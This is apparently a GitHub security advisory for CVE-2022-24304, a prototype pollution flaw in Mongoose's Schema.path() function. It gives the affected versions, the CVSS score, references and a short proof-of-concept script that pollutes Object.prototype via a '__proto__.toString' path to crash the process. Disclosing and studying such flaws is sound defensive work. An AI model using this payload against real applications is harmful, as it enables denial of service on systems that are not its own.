# [C] Mongoose Vulnerable to Prototype Pollution in Schema Object

## Summary
Severity: Critical
Advisory: GHSA-h8hf-x3f4-xwgp
CVE: CVE-2022-24304
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2022-08-27
Source: https://github.com/advisories/GHSA-h8hf-x3f4-xwgp
Type: github-advisory

## Affected
- npm: `mongoose` — affected >=6.0.0 <6.4.6
- npm: `mongoose` — affected >=0 <5.13.15

## Details
### Description
Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.

Affected versions of this package are vulnerable to Prototype Pollution. The `Schema.path()` function is vulnerable to prototype pollution when setting the `schema` object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.

### Proof of Concept
```js
// poc.js
const mongoose = require('mongoose');
const schema = new mongoose.Schema();

malicious_payload = '__proto__.toString'

schema.path(malicious_payload, [String])

x = {}
console.log(x.toString()) // crashed (Denial of service (DoS) attack)
```

### Impact
This vulnerability can be manipulated to exploit other types of attacks, such as Denial of service (DoS), Remote Code Execution, or Property Injection.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2022-24304
- https://github.com/Automattic/mongoose/issues/12085
- https://github.com/Automattic/mongoose/commit/6a197316564742c0422309e1b5fecfa4faec126e
- https://github.com/Automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8
- https://github.com/Automattic/mongoose/blob/51e758541763b6f14569744ced15cc23ab8b50c6/lib/schema.js#L88-L141
- https://huntr.dev/bounties/055be524-9296-4b2f-b68d-6d5b810d1ddd
